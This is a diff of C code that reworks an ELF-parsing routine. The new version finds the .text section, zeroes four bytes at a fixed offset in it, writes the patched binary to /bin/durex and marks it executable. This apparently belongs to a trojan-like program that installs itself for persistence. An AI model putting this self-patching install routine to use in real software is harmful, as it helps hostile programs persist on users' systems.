@@ -31,38 +31,30 @@ static void		sigsig(void)
 static int		elf_parsing(void *file, int f_size)
 {
 	Elf64_Ehdr	*main_header;
-	Elf64_Phdr	*header;
-	uint64_t	entry;
-	void		*text_begin;
-	int		text_size;
-	int		i;
+	Elf64_Shdr	*header;
+	Elf64_Shdr	*strtab;
+	const char	*addr_strtab;
 	int		fd;
 	char		path[] = "/bin/durex";
 
-	i = 0;
 	main_header = (Elf64_Ehdr *)file;
-	entry = main_header->e_entry;
-	header = (Elf64_Phdr*)(file + sizeof(Elf64_Ehdr));
-	while (i < main_header->e_phnum)
+	header = (Elf64_Shdr*)(file + main_header->e_shoff);
+	strtab = &header[main_header->e_shstrndx];
+	addr_strtab = file + strtab->sh_offset;
+	for (int i = 0; i < main_header->e_shnum; i++)
 	{
-		if ((header->p_type == PT_LOAD) && (entry > header->p_vaddr) && (entry < (header->p_vaddr + header->p_memsz)))
+		if (strcmp(".text", addr_strtab + header[i].sh_name) == 0)
 		{
-			text_begin = header->p_offset + file;
-			text_size = header->p_filesz;
-			if (text_begin + text_size > file + f_size)
+			memset(file + header[i].sh_offset + header[i].sh_size - 0x20D, '\0', 4);
+			if ((fd = open(path, O_CREAT | O_WRONLY)) < 0)
 				return (1);
-			break;
+			write(fd, file, f_size);
+			chmod(path, S_IXUSR);
+			close(fd);
+			return (0);
 		}
-		header++;
-		i++;
 	}
-	memset(text_begin + 0x2820, '\0', 4);
-	if ((fd = open(path, O_CREAT | O_WRONLY)) < 0)
-		return (1);
-	write(fd, file, f_size);
-	chmod(path, S_IXUSR);
-	close(fd);
-	return (0);
+	return (1);
 }
 
 static int 		copy_file(char *path)
